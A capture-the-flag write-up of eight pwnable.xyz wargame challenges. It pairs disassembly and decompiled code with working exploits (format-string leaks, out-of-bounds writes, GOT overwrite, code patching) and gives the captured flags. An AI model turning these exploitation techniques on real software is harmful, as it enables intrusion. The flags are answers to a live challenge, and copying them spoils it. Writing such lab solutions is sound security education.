---
title: Pwnable.xyz Writeup [50 points]
tags: assignment3 wargame ctf writeup pwnable pwnable.xyz
---
## 0. Welcome
```bash
gdb-peda$ disas main
No symbol "main" in current context.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```
``main`` cannot be found.
After running once, I tried to find ``main`` from ``__libc_start_main``
```bash
    0x7fffff050822 <__libc_start_main+226>:      mov    edi,DWORD PTR [rsp+0x14]
    0x7fffff050826 <__libc_start_main+230>:      mov    rdx,QWORD PTR [rax]
    0x7fffff050829 <__libc_start_main+233>:      mov    rax,QWORD PTR [rsp+0x18]
=>  0x7fffff05082e <__libc_start_main+238>:      call   rax
    0x7fffff050830 <__libc_start_main+240>:      mov    edi,eax
    0x7fffff050832 <__libc_start_main+242>:      call   0x7fffff06a030 <__GI_exit>
    0x7fffff050837 <__libc_start_main+247>:      xor    edx,edx
    0x7fffff050839 <__libc_start_main+249>:      jmp    0x7fffff050779 <__libc_start_main+57>
```
disassembly:
```nasm
gdb-peda$ x/100i 0x8000920
=> 0x8000920:   push   rbp
   0x8000921:   push   rbx
   0x8000922:   sub    rsp,0x18
   0x8000926:   mov    rax,QWORD PTR fs:0x28
   0x800092f:   mov    QWORD PTR [rsp+0x8],rax
   0x8000934:   xor    eax,eax
   0x8000936:   call   0x8000b4e
   0x800093b:   lea    rdi,[rip+0x2e2]        # 0x8000c24   "Welcome"
   0x8000942:   call   0x80008b0            ;puts
   0x8000947:   mov    edi,0x40000
   0x800094c:   call   0x80008e8            ;malloc
   0x8000951:   lea    rsi,[rip+0x2d5]        # 0x8000c2d   "Leak: %p\n"
   0x8000958:   mov    rdx,rax
   0x800095b:   mov    rbx,rax              ;1st malloc-ed address saved at rbx
   0x800095e:   mov    QWORD PTR [rax],0x1
   0x8000965:   mov    edi,0x1
   0x800096a:   xor    eax,eax
   0x800096c:   call   0x80008f0            ;printf
   0x8000971:   lea    rsi,[rip+0x2bf]        # 0x8000c37   "Length of your message: "
   0x8000978:   mov    edi,0x1
   0x800097d:   xor    eax,eax
   0x800097f:   call   0x80008f0            ;printf
   0x8000984:   lea    rdi,[rip+0x2c5]        # 0x8000c50   "%lu"
   0x800098b:   mov    rsi,rsp              ;inputted length saved at rsp
   0x800098e:   xor    eax,eax
   0x8000990:   mov    QWORD PTR [rsp],0x0
   0x8000998:   call   0x8000900            ;scanf
   0x800099d:   mov    rdi,QWORD PTR [rsp]
   0x80009a1:   call   0x80008e8            ;malloc
   0x80009a6:   lea    rsi,[rip+0x2a7]        # 0x8000c54   "Enter your message: "
   0x80009ad:   mov    rbp,rax              ;2nd malloc-ed address saved at rbp
   0x80009b0:   mov    edi,0x1
   0x80009b5:   xor    eax,eax
   0x80009b7:   call   0x80008f0            ;printf
   0x80009bc:   mov    rdx,QWORD PTR [rsp]  ;length
   0x80009c0:   xor    edi,edi              ;0
   0x80009c2:   mov    rsi,rbp              ;2nd malloc-ed space
   0x80009c5:   call   0x80008d8            ;read
   0x80009ca:   mov    rdx,QWORD PTR [rsp]
   0x80009ce:   mov    rsi,rbp
   0x80009d1:   mov    edi,0x1
   0x80009d6:   mov    BYTE PTR [rbp+rdx*1-0x1],0x0 ;last char of 2nd malloc-ed space
   0x80009db:   call   0x80008b8            ;write
   0x80009e0:   cmp    QWORD PTR [rbx],0x0  ;rbx = 1st malloc-ed address
   0x80009e4:   jne    0x80009f2
   0x80009e6:   lea    rdi,[rip+0x27c]        # 0x8000c69   "cat /flag"
   0x80009ed:   call   0x80008c8            ;system
   0x80009f2:   xor    eax,eax
   0x80009f4:   mov    rcx,QWORD PTR [rsp+0x8]
   0x80009f9:   xor    rcx,QWORD PTR fs:0x28
   0x8000a02:   je     0x8000a09
   0x8000a04:   call   0x80008c0
   0x8000a09:   add    rsp,0x18
   0x8000a0d:   pop    rbx
   0x8000a0e:   pop    rbp
   0x8000a0f:   ret
```
The main function mallocs a large space at the beginning and write 1 to the first byte.

After that, it mallocates another space with sepcified size, and reads user input to that space.

Then, it writes 0 to [2nd malloc + size - 1].

Finally it compares 1st malloc's first byte with 0 and prints flag if equal.

The key to this problem is in malloc's return value.

When malloc fails to allocate memory, it returns 0. Using this, we could write 0 to whereever we want.

By inputting leaked_address-1 to size, the destination for ``mov 0`` becomes [0+leaked_address+1-1] and we can get past the compare instruction.

```bash
junheah@ubuntu:~$ nc svc.pwnable.xyz 30000
Welcome.
Leak: 0x7fcdd49f5010
Length of your message: 140522012233745
Enter your message: a
FLAG{did_you_really_need_a_script_to_solve_this_one?}
```

notes:
```
malloc:
    input: rdi - size
    output: rax - location (if failed, returns 0)
printf:
    input: edi - output location (fd?), rsi - string address, rdx,... - pointer values if formatted string
```


## 1. Sub
```c
//hexray generated with ida pro
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v4; // [rsp+0h] [rbp-18h]
  int v5; // [rsp+4h] [rbp-14h]
  unsigned __int64 v6; // [rsp+8h] [rbp-10h]

  v6 = __readfsqword(0x28u);
  sub_A3E();
  v4 = 0;
  v5 = 0;
  _printf_chk(1LL, "1337 input: ");
  _isoc99_scanf("%u %u", &v4, &v5);
  if ( v4 <= 4918 && v5 <= 4918 )
  {
    if ( v4 - v5 == 4919 )
      system("cat /flag");
  }
  else
  {
    puts("Sowwy");
  }
  return 0LL;
}
```
``scanf`` reads input as unsigned integer, but the variable type is int, so we could just input negative values.
```bash
junheah@ubuntu:~$ nc svc.pwnable.xyz 30001
1337 input: 4918 -1
FLAG{sub_neg_==_add}
```

## 2. Add
```nasm
...
   0x000000000040088e <+89>:    lea    rcx,[rbp-0x68]   ;c
   0x0000000000400892 <+93>:    lea    rdx,[rbp-0x70]   ;b
   0x0000000000400896 <+97>:    lea    rax,[rbp-0x78]   ;a
   0x000000000040089a <+101>:   mov    rsi,rax
   0x000000000040089d <+104>:   lea    rdi,[rip+0x102]        # 0x4009a6   "%ld %ld %ld"
   0x00000000004008a4 <+111>:   mov    eax,0x0
   0x00000000004008a9 <+116>:   call   0x4006a0 <__isoc99_scanf@plt>
   0x00000000004008ae <+121>:   mov    DWORD PTR [rbp-0x7c],eax
   0x00000000004008b1 <+124>:   cmp    DWORD PTR [rbp-0x7c],0x3
   0x00000000004008b5 <+128>:   jne    0x4008cd <main+152>
...
```
The main function has a while loop with the condition of rax == 3. The while loop gets three long input values per loop.
```nasm
...
   0x00000000004008b7 <+130>:   mov    rax,QWORD PTR [rbp-0x68] ;c
   0x00000000004008bb <+134>:   mov    rcx,QWORD PTR [rbp-0x78] ;b
   0x00000000004008bf <+138>:   mov    rdx,QWORD PTR [rbp-0x70] ;a
   0x00000000004008c3 <+142>:   add    rdx,rcx
   0x00000000004008c6 <+145>:   mov    QWORD PTR [rbp+rax*8-0x60],rdx
   0x00000000004008cb <+150>:   jmp    0x4008e3 <main+174>
...
```
After getting the input, value [a+b] is written to address of [rbp+c*8-0x60]

Since there is function ``win`` that prints out flag, we could get the flag by overwriting the return address with address of ``win``.

exploit:
```bash
junheah@ubuntu:~$ nc svc.pwnable.xyz 30002
Input: 4196386 0 13
Result: 4196386Input: a
FLAG{easy_00b_write}
```

## 3. Misalignment
```nasm
0x0000000008000a17 <+56>:    lea    rax,[rbp-0xa0]
0x0000000008000a1e <+63>:    add    rax,0xf
0x0000000008000a22 <+67>:    mov    esi,0xdeadbeef
0x0000000008000a27 <+72>:    mov    QWORD PTR [rax],rsi
```
The main function write 0xdeadbeef to rbp-0xa0+0xf (rbp-0x91)
```nasm
0x0000000008000a2a <+75>:    lea    rax,[rbp-0xa0]
0x0000000008000a31 <+82>:    lea    rcx,[rax+0x30]  ;c [rbp-0x70]
0x0000000008000a35 <+86>:    lea    rax,[rbp-0xa0]
0x0000000008000a3c <+93>:    lea    rdx,[rax+0x28]  ;b [rbp-0x78]
0x0000000008000a40 <+97>:    lea    rax,[rbp-0xa0]
0x0000000008000a47 <+104>:   add    rax,0x20
0x0000000008000a4b <+108>:   mov    rsi,rax ;a [rbp-0x80]
0x0000000008000a4e <+111>:   lea    rdi,[rip+0x149]        # 0x8000b9e  ;"%ld %ld %ld"
0x0000000008000a55 <+118>:   mov    eax,0x0
0x0000000008000a5a <+123>:   call   0x8000818   ;scanf
0x0000000008000a5f <+128>:   mov    DWORD PTR [rbp-0xa4],eax
0x0000000008000a65 <+134>:   cmp    DWORD PTR [rbp-0xa4],0x3
0x0000000008000a6c <+141>:   jne    0x8000ac6 <main+231>
0x0000000008000a6e <+143>:   mov    rax,QWORD PTR [rbp-0x70]    ;c
0x0000000008000a72 <+147>:   cmp    rax,0x9
0x0000000008000a76 <+151>:   jg     0x8000ac6 <main+231>
0x0000000008000a78 <+153>:   mov    rax,QWORD PTR [rbp-0x70]    ;b
0x0000000008000a7c <+157>:   cmp    rax,0xfffffffffffffff9
0x0000000008000a80 <+161>:   jl     0x8000ac6 <main+231>
```
Then it gets into a while loop with condition of scanf() == 3, c <= 9, b >= -7. a,b,c are variables that scanf() gets input to.
```nasm
0x0000000008000a82 <+163>:   mov    rax,QWORD PTR [rbp-0x70]    ;c
0x0000000008000a86 <+167>:   mov    rcx,QWORD PTR [rbp-0x80]    ;a
0x0000000008000a8a <+171>:   mov    rdx,QWORD PTR [rbp-0x78]    ;b
0x0000000008000a8e <+175>:   add    rdx,rcx ;a+b
0x0000000008000a91 <+178>:   add    rax,0x6 ;c+6
0x0000000008000a95 <+182>:   mov    QWORD PTR [rbp+rax*8-0x98],rdx
```
Then a+b is saved to [rbp+(c+6)*8-0x98]
```nasm
0x0000000000000ac6 <+231>:   lea    rax,[rbp-0xa0]
0x0000000000000acd <+238>:   add    rax,0xf
0x0000000000000ad1 <+242>:   mov    rdx,QWORD PTR [rax]
0x0000000000000ad4 <+245>:   movabs rax,0xb000000b5
0x0000000000000ade <+255>:   cmp    rdx,rax
0x0000000000000ae1 <+258>:   jne    0xae8 <main+265>
0x0000000000000ae3 <+260>:   call   0x9cc <win>
```
Finally, it compares rbp-0x91 with 0xb000000b5 and shows flag if same.

I figured by using correct a,b,c input values, we could change the 0xdeadbeef to 0xb000000b5.

But since we are aligned to 8bytes, we have to write twice, to rbp-0x90 and rbp-0x98.

exploit:
```bash
junheah@ubuntu:~$ nc svc.pwnable.xyz 30003
184549376 0 -5
Result: 184549376
-5404319552844595200 0 -6
Result: -5404319552844595200
a
FLAG{u_cheater_used_a_debugger}
```

## 4. GrownUp
```c
// ida pro hexray
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *src; // ST08_8
  __int64 buf; // [rsp+10h] [rbp-20h]
  __int64 v6; // [rsp+18h] [rbp-18h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setup();
  buf = 0LL;
  v6 = 0LL;
  printf("Are you 18 years or older? [y/N]: ", argv);
  *((_BYTE *)&buf + (signed int)((unsigned __int64)read(0, &buf, 0x10uLL) - 1)) = 0;
  if ( (_BYTE)buf != 121 && (_BYTE)buf != 89 )
    return 0;
  src = (char *)malloc(0x84uLL);
  printf("Name: ", &buf);   //0x400A1B
  read(0, src, 0x80uLL);
  strcpy(usr, src);         //usr: 0x6010E0
  printf("Welcome ", src);  //0x400A22
  printf(qword_601160, usr);
  return 0;
}
```
flag variable location:
```
.data:0000000000601080                 public flag
.data:0000000000601080 flag            db 'FLAG{_the_real_flag_will_be_here_}',0
```
I was stuck for quite a while here, until I found out that when max amount to data is inputted to src buffer, extra null byte is copied to usr. This is because ``strcpy`` considers null byte as the end of buffer, and copies the buffer including that extra null byte. So in this case, if we input 128 bytes (including newline), usr+0x80(0x601160) would be overwritten by a null byte.

0x601160 contains address for "%s\n", initialized in function ``setup``.
```bash
gdb-peda$ x/wx 0x601160
0x601160 <usr+128>:     0x00601168
```
When last byte becomes null, the address would become 0x00601100, which is usr+0x20. Giving us control over first arg in printf, which in other words, vulnerable to a format string attack.

But how are we going to get the flag, which doesn't exist inside the stack?

For this, I'm going to make use of first read input. I only uses first byte in the code, but it actually reads 0x10 bytes. We could use this additional space to store address of flag.

By putting multiple ``%p`` specifiers I was able to find our input ('bbbbbbbb') at the 9th ``%p``.
```bash
junheah@ubuntu:~$ ./GrownUp
Are you 18 years or older? [y/N]: yaaaaaaabbbbbbb
Name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
Welcome 0x6010e0 0x7fb0dcff6780 0x5d 0x7fb0dd360700 0x8 0x10f413a12e 0x682010 0x6161616161616179 0x62626262626262 0x7ffff413a210 0xb51988fb65246c00 0x400970 0x7fb0dcc50830 0x1 0x7ffff413a218 0x1dd225ca0 0x400865 (nil) 0x1c86fab81427b81e 0x4006e0 0x7ffff413a210 (nil) (nil) 0xe379121f4447b81e 0xe3e743b20917b81e (nil) (nil) (nil) 0x7ffff413a228 0x7fb0dd227168 0x7fb0dd0107db (nil)
```
exploit code:
```python
from pwn import *

payload = ''
payload += 'yaaaaaaa'
payload += p64(0x601080)

r = remote('svc.pwnable.xyz', 30004)
r.recvuntil(': ')
r.send(payload)

payload = ''
payload += 'a'*0x20
payload += '%p '*8 + '%s' + ' %p'*23

r.recvuntil(': ')
r.sendline(payload)
r.interactive()
```
exploit:
```bash
junheah@ubuntu:~$ python exp.py
[+] Opening connection to svc.pwnable.xyz on port 30004: Done
[*] Switching to interactive mode
Welcome 0x6010e0 0x7f73401958c0 (nil) 0x7f73403bc500 0x8 0x10401a83d0 0x2449260 0x6161616161616179 FLAG{should_have_named_it_babyfsb} 0x7ffe6e30c2b0 0x7081d0c33e1faa00 0x400970 0x7f733fdfdeae 0x100000 0x7ffe6e30c2b8 0x13ff59428 0x400865 (nil) 0x90a4c3c5d8057cd3 0x4006e0 (nil) (nil) (nil) 0x6f581f2449257cd3 0x6e42bcfa76297cd3 (nil) (nil) (nil) 0x7ffe6e30c2c8 0x7f73403c1190 0x7f73401a832b (nil)
[*] Got EOF while reading in interactive
```

## 5. Note
``main``:
```c
// local variable allocation has failed, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax

  setup(*(_QWORD *)&argc, argv, envp);
  puts("Note taking 101.");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        print_menu();
        v3 = read_int32();
        if ( v3 != 1 )
          break;
        edit_note();
      }
      if ( v3 != 2 )
        break;
      edit_desc();
    }
    if ( !v3 )
      break;
    puts("Invalid");
  }
  return 0;
}
```
``edit_note``:
```c
void edit_note()
{
  int v0; // ST04_4
  void *buf; // ST08_8

  printf("Note len? ");
  v0 = read_int32();
  buf = malloc(v0);
  printf("note: ");
  read(0, buf, v0);
  strncpy(s, (const char *)buf, v0);
  free(buf);
}
```
``edit_desc``:
```c
// buf = 0x6014a0 <s+32>
ssize_t edit_desc()
{
  if ( !buf )
    buf = malloc(0x20uLL);
  printf("desc: ");
  return read(0, buf, 0x20uLL);
}
```
``win`` is just a function that leaks the content of flag file.

Since there is such function like ``win``, our objective here is to somehow change the program flow and make the program call ``win``.
Sadly, overflowing the stack to change the return address is not possible.

However, since we could change where ``edit_desc`` writes to, we could achieve above goal by overwriting a function's address in got table.

exploit code:
```python
from pwn import *

binary = ELF('./note')
r = remote('svc.pwnable.xyz', 30016)
r.recvuntil('> ')
r.sendline('1')
r.recvuntil('? ')
r.sendline('40')
r.recvuntil(': ')

payload = ''
payload += 'a'*32
payload += p64(binary.got['read'])

r.send(payload)

r.recvuntil('> ')
r.sendline('2')
r.recvuntil(': ')

payload = ''
payload += p64(binary.symbols['win'])

r.sendline(payload)

r.recvuntil('> ')
r.sendline('2')
r.interactive()
```
exploit:
```bash
junheah@ubuntu:~$ python exp.py
[*] './note'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to svc.pwnable.xyz on port 30016: Done
[*] Switching to interactive mode
FLAG{useless_if_u_cant_print_the_note}desc: FLAG{useless_if_u_cant_print_the_note}Menu:
 1. Edit note.
 2. Edit desc.
 0. Exit
> FLAG{useless_if_u_cant_print_the_note}[*] Got EOF while reading in interactive
$  
```

## 6. Xor
```nasm
Dump of assembler code for function main:
   0x0000000008000a34 <+0>:     push   rbp
   0x0000000008000a35 <+1>:     mov    rbp,rsp
   0x0000000008000a38 <+4>:     sub    rsp,0x30
   0x0000000008000a3c <+8>:     mov    rax,QWORD PTR fs:0x28
   0x0000000008000a45 <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000008000a49 <+21>:    xor    eax,eax
   0x0000000008000a4b <+23>:    lea    rdi,[rip+0x15b]        # 0x8000bad "The Poopolator"
   0x0000000008000a52 <+30>:    call   0x80007f0 <puts@plt>
   0x0000000008000a57 <+35>:    call   0x80009c9 <setup>
   0x0000000008000a5c <+40>:    mov    QWORD PTR [rbp-0x10],0x0
   0x0000000008000a64 <+48>:    lea    rdi,[rip+0x151]        # 0x8000bbc "> 💩   "
   0x0000000008000a6b <+55>:    mov    eax,0x0
   0x0000000008000a70 <+60>:    call   0x8000800 <printf@plt>
   0x0000000008000a75 <+65>:    lea    rcx,[rbp-0x10]
   0x0000000008000a79 <+69>:    lea    rdx,[rbp-0x18]
   0x0000000008000a7d <+73>:    lea    rax,[rbp-0x20]
   0x0000000008000a81 <+77>:    mov    rsi,rax
   0x0000000008000a84 <+80>:    lea    rdi,[rip+0x13b]        # 0x8000bc6 "%ld %ld %ld"
   0x0000000008000a8b <+87>:    mov    eax,0x0
   0x0000000008000a90 <+92>:    call   0x8000828 <scanf>
   0x0000000008000a95 <+97>:    mov    DWORD PTR [rbp-0x24],eax
   0x0000000008000a98 <+100>:   mov    rax,QWORD PTR [rbp-0x20]   ; a exists
   0x0000000008000a9c <+104>:   test   rax,rax
   0x0000000008000a9f <+107>:   je     0x8000ac3 <main+143>
   0x0000000008000aa1 <+109>:   mov    rax,QWORD PTR [rbp-0x18]   ; b exists
   0x0000000008000aa5 <+113>:   test   rax,rax
   0x0000000008000aa8 <+116>:   je     0x8000ac3 <main+143>
   0x0000000008000aaa <+118>:   mov    rax,QWORD PTR [rbp-0x10]   ; c exists
   0x0000000008000aae <+122>:   test   rax,rax
   0x0000000008000ab1 <+125>:   je     0x8000ac3 <main+143>
   0x0000000008000ab3 <+127>:   mov    rax,QWORD PTR [rbp-0x10]   ; c<=9
   0x0000000008000ab7 <+131>:   cmp    rax,0x9
   0x0000000008000abb <+135>:   jg     0x8000ac3 <main+143>
   0x0000000008000abd <+137>:   cmp    DWORD PTR [rbp-0x24],0x3 ; input count == 3
   0x0000000008000ac1 <+141>:   je     0x8000acd <main+153>
   0x0000000008000ac3 <+143>:   mov    edi,0x1
   0x0000000008000ac8 <+148>:   call   0x8000830 <exit@plt>
   0x0000000008000acd <+153>:   mov    rax,QWORD PTR [rbp-0x10]
   0x0000000008000ad1 <+157>:   mov    rcx,QWORD PTR [rbp-0x20]
   0x0000000008000ad5 <+161>:   mov    rdx,QWORD PTR [rbp-0x18]
   0x0000000008000ad9 <+165>:   xor    rcx,rdx          ; a^b
   0x0000000008000adc <+168>:   lea    rdx,[rax*8+0x0]  ; c*8
   0x0000000008000ae4 <+176>:   lea    rax,[rip+0x201715]        # 0x8202200 <result>
   0x0000000008000aeb <+183>:   mov    QWORD PTR [rdx+rax*1],rcx  ; <result>+c*8 = a^b
   0x0000000008000aef <+187>:   mov    rax,QWORD PTR [rbp-0x10]
   0x0000000008000af3 <+191>:   lea    rdx,[rax*8+0x0]
   0x0000000008000afb <+199>:   lea    rax,[rip+0x2016fe]        # 0x8202200 <result>
   0x0000000008000b02 <+206>:   mov    rax,QWORD PTR [rdx+rax*1]
   0x0000000008000b06 <+210>:   mov    rsi,rax
   0x0000000008000b09 <+213>:   lea    rdi,[rip+0xc2]        # 0x8000bd2 "Result: %ld\n"
   0x0000000008000b10 <+220>:   mov    eax,0x0
   0x0000000008000b15 <+225>:   call   0x8000800 <printf@plt>
   0x0000000008000b1a <+230>:   jmp    0x8000a5c <main+40>
End of assembler dump.
```
The main function has a loop that gets 3 long inputs : a, b, c. All 3 input must be valid and c has to be smaller or equal to 9, otherwise the program terminates.

After validation, XOR of a and b is saved to [result + c*8].

```bash
gdb-peda$ cat /proc/187/maps
08000000-08001000 rwxp 00000000 00:00 976125                     ~/challenge
08201000-08202000 r--p 00001000 00:00 976125                     ~/challenge
08202000-08203000 rw-p 00002000 00:00 976125                     ~/challenge
...
```
We have write permission to code segment.

And since the address of ``main`` is smaller than ``<result>``, we could overwrite a call instruction with ``<win>``'s address and get the flag.

the call instruction looks something like this when disassembled:
```
E8 X1 X2 X3 X4  ; X4 X3 X2 X1 : offset = [target address] - [current eip(rip)] - 5
```
I'm going to overwrite the call instruction at <main+225>, so eip would be 0x8000b15. With the target address of 0x8000a21, offset would be [0x8000a21 - 0x8000b15 - 5] = 0xffffff07.

Also, we have to consider the fact that our target address should be in the form of [<result> - 8*i]. Forcing us to use 0x8000b10 (= <result> - (262878*8))

We have to change this
```
0x8000b15 E8 E6 FC FF FF
0x8000b10 <main+220>:   0xfce6e800000000b8
```
to this
```
0x8000b15 E8 07 FF FF FF
0x8000b10 <main+220>:   0xff07e800000000b8
```

exploit:
```bash
junheah@ubuntu:~$ nc svc.pwnable.xyz 30029
The Poopolator
> 💩   -69832182503309127 1 -262878
FLAG{how_did_text_happen_to_be_rwx}> 💩
```
```
reference:
https://umbum.tistory.com/102
```

## 7. Two Targets
```nasm
...
0x0000000000400b3b <+55>:    call   0x4009af <read_int32>
0x0000000000400b40 <+60>:    mov    DWORD PTR [rbp-0x44],eax
0x0000000000400b43 <+63>:    mov    eax,DWORD PTR [rbp-0x44]
0x0000000000400b46 <+66>:    cmp    eax,0x2
0x0000000000400b49 <+69>:    je     0x400b9b <main+151>
0x0000000000400b4b <+71>:    cmp    eax,0x2
0x0000000000400b4e <+74>:    jg     0x400b5a <main+86>
0x0000000000400b50 <+76>:    cmp    eax,0x1
0x0000000000400b53 <+79>:    je     0x400b6d <main+105>
0x0000000000400b55 <+81>:    jmp    0x400c0c <main+264>
0x0000000000400b5a <+86>:    cmp    eax,0x3
0x0000000000400b5d <+89>:    je     0x400bca <main+198>
0x0000000000400b5f <+91>:    cmp    eax,0x4
0x0000000000400b62 <+94>:    je     0x400bf5 <main+241>
0x0000000000400b68 <+100>:   jmp    0x400c0c <main+264>
...
```
The main function reads input from user and jumps to inputted menu.
```
...
<1> change name
0x0000000000400b6d <+105>:   lea    rdi,[rip+0x11d5]        # 0x401d49 "name: "
0x0000000000400b74 <+112>:   mov    eax,0x0
0x0000000000400b79 <+117>:   call   0x4007b0 <printf@plt>
0x0000000000400b7e <+122>:   lea    rax,[rbp-0x40]
0x0000000000400b82 <+126>:   mov    rsi,rax
0x0000000000400b85 <+129>:   lea    rdi,[rip+0x11c4]        # 0x401d50 "%32s"
0x0000000000400b8c <+136>:   mov    eax,0x0
0x0000000000400b91 <+141>:   call   0x400820 <__isoc99_scanf@plt>
0x0000000000400b96 <+146>:   jmp    0x400c1b <main+279>

<2> change nationality
0x0000000000400b9b <+151>:   lea    rdi,[rip+0x11b3]        # 0x401d55 "nationality: "
0x0000000000400ba2 <+158>:   mov    eax,0x0
0x0000000000400ba7 <+163>:   call   0x4007b0 <printf@plt>
0x0000000000400bac <+168>:   lea    rax,[rbp-0x40]
0x0000000000400bb0 <+172>:   add    rax,0x20
0x0000000000400bb4 <+176>:   mov    rsi,rax
0x0000000000400bb7 <+179>:   lea    rdi,[rip+0x11a5]        # 0x401d63 "%24s"
0x0000000000400bbe <+186>:   mov    eax,0x0
0x0000000000400bc3 <+191>:   call   0x400820 <__isoc99_scanf@plt>
0x0000000000400bc8 <+196>:   jmp    0x400c1b <main+279>

<3> change age
0x0000000000400bca <+198>:   lea    rdi,[rip+0x1197]        # 0x401d68 "age: "
0x0000000000400bd1 <+205>:   mov    eax,0x0
0x0000000000400bd6 <+210>:   call   0x4007b0 <printf@plt>
0x0000000000400bdb <+215>:   mov    rax,QWORD PTR [rbp-0x10]
0x0000000000400bdf <+219>:   mov    rsi,rax
0x0000000000400be2 <+222>:   lea    rdi,[rip+0x1185]        # 0x401d6e "%d"
0x0000000000400be9 <+229>:   mov    eax,0x0
0x0000000000400bee <+234>:   call   0x400820 <__isoc99_scanf@plt>
0x0000000000400bf3 <+239>:   jmp    0x400c1b <main+279>

<4> get shell
0x0000000000400bf5 <+241>:   lea    rax,[rbp-0x40]   ;name
0x0000000000400bf9 <+245>:   mov    rdi,rax
0x0000000000400bfc <+248>:   call   0x400a26 <auth>
0x0000000000400c01 <+253>:   test   al,al
0x0000000000400c03 <+255>:   je     0x400c1a <main+278>
0x0000000000400c05 <+257>:   call   0x40099c <win>
0x0000000000400c0a <+262>:   jmp    0x400c1a <main+278>
...
```
``auth`` function in ``get shell`` checks the previously inputted ``name`` value.
```nasm
...
0x0000000000400a6a <+68>:    mov    rdx,QWORD PTR [rbp-0x48] ;name
0x0000000000400a6e <+72>:    mov    eax,DWORD PTR [rbp-0x38] ;i
0x0000000000400a71 <+75>:    cdqe
0x0000000000400a73 <+77>:    movzx  eax,BYTE PTR [rdx+rax*1] ;name[i]
0x0000000000400a77 <+81>:    shr    al,0x4   ; name[i] >> 4
0x0000000000400a7a <+84>:    mov    ecx,eax
0x0000000000400a7c <+86>:    mov    rdx,QWORD PTR [rbp-0x48]
0x0000000000400a80 <+90>:    mov    eax,DWORD PTR [rbp-0x38]
0x0000000000400a83 <+93>:    cdqe
0x0000000000400a85 <+95>:    movzx  eax,BYTE PTR [rdx+rax*1]
0x0000000000400a89 <+99>:    movzx  eax,al
0x0000000000400a8c <+102>:   shl    eax,0x4  ; name[i] << 4
0x0000000000400a8f <+105>:   or     eax,ecx
0x0000000000400a91 <+107>:   mov    BYTE PTR [rbp-0x39],al   ; name[i] << 4 | name[i] >> 4
0x0000000000400a94 <+110>:   mov    eax,DWORD PTR [rbp-0x38]
0x0000000000400a97 <+113>:   movsxd rdx,eax
0x0000000000400a9a <+116>:   lea    rax,[rip+0x63]        # 0x400b04 <main>
0x0000000000400aa1 <+123>:   add    rax,rdx
0x0000000000400aa4 <+126>:   movzx  eax,BYTE PTR [rax]   ; main[i]
0x0000000000400aa7 <+129>:   xor    al,BYTE PTR [rbp-0x39]   ;main[i] ^ (name[i] << 4 | name[i] >> 4)
0x0000000000400aaa <+132>:   mov    edx,eax
0x0000000000400aac <+134>:   mov    eax,DWORD PTR [rbp-0x38]
0x0000000000400aaf <+137>:   cdqe
0x0000000000400ab1 <+139>:   mov    BYTE PTR [rbp+rax*1-0x30],dl ;save result at [rbp-0x30]
0x0000000000400ab5 <+143>:   add    DWORD PTR [rbp-0x38],0x1
0x0000000000400ab9 <+147>:   mov    eax,DWORD PTR [rbp-0x38] ;i
0x0000000000400abc <+150>:   cmp    eax,0x1f
0x0000000000400abf <+153>:   jbe    0x400a6a <auth+68>
...
```
I implemented the encoding process in python:
```python
name = 'a'*32
main = [0x55,0x48,0x89,0xe5,0x48,0x83,0xec,0x50,0x64,0x48,0x8b,0x04,0x25,0x28,0x00,0x00,0x00,0x48,0x89,0x45,0xf8,0x31,0xc0,0xe8,0x24,0xfe,0xff,0xff,0x48,0x8d,0x45,0xc0]
target = [0x11,0xde,0xcf,0x10,0xdf,0x75,0xbb,0xa5,0x43,0x1e,0x9d,0xc2,0xe3,0xbf,0xf5,0xd6,0x96,0x7f,0xbe,0xb0,0xbf,0xb7,0x96,0x1d,0xa8,0xbb,0x0a,0xd9,0xbf,0xc9,0x0d,0xff]
res = []

#encode:
for i in range(0, 32):
    res.append((((ord(name[i]) >> 4) | (ord(name[i]) << 4)) & 0xff) ^ main[i])
```
``auth`` goes through this encoding process and compares it with 0x401d28
```nasm
...
0x0000000000400ac1 <+155>:   lea    rax,[rbp-0x30]
0x0000000000400ac5 <+159>:   mov    edx,0x20
0x0000000000400aca <+164>:   lea    rsi,[rip+0x1257]        # 0x401d28
0x0000000000400ad1 <+171>:   mov    rdi,rax
0x0000000000400ad4 <+174>:   call   0x400770 <strncmp@plt>
...
```
By reversing the encoding process, I was able to get the correct input.

exploit code:
```python
from pwn import *

main = [0x55,0x48,0x89,0xe5,0x48,0x83,0xec,0x50,0x64,0x48,0x8b,0x04,0x25,0x28,0x00,0x00,0x00,0x48,0x89,0x45,0xf8,0x31,0xc0,0xe8,0x24,0xfe,0xff,0xff,0x48,0x8d,0x45,0xc0]
target = [0x11,0xde,0xcf,0x10,0xdf,0x75,0xbb,0xa5,0x43,0x1e,0x9d,0xc2,0xe3,0xbf,0xf5,0xd6,0x96,0x7f,0xbe,0xb0,0xbf,0xb7,0x96,0x1d,0xa8,0xbb,0x0a,0xd9,0xbf,0xc9,0x0d,0xff]

#decode
newname = ''
for i in range(0, 32):
    t = target[i]^main[i]
    newname += chr((t << 4 | t >> 4) & 0xff)
print newname

r = remote('svc.pwnable.xyz', 30031)
r.recvuntil('> ')
r.sendline('1')
r.recvuntil('name: ')
r.sendline(newname)
r.recvuntil('> ')
r.sendline('4')
r.interactive()
```
exploit:
```bash
junheah@ubuntu:~$ python exp.py
Did_you_really_miss_the_T_b\x7fD\x84
[+] Opening connection to svc.pwnable.xyz on port 30031: Done
[*] Switching to interactive mode
Invalid
Menu:
  1. Change name.
  2. Change nationality.
  3. Change age.
  4. Get shell.
> FLAG{now_try_the_2nd_solution}Menu:
  1. Change name.
  2. Change nationality.
  3. Change age.
  4. Get shell.
> $  
```
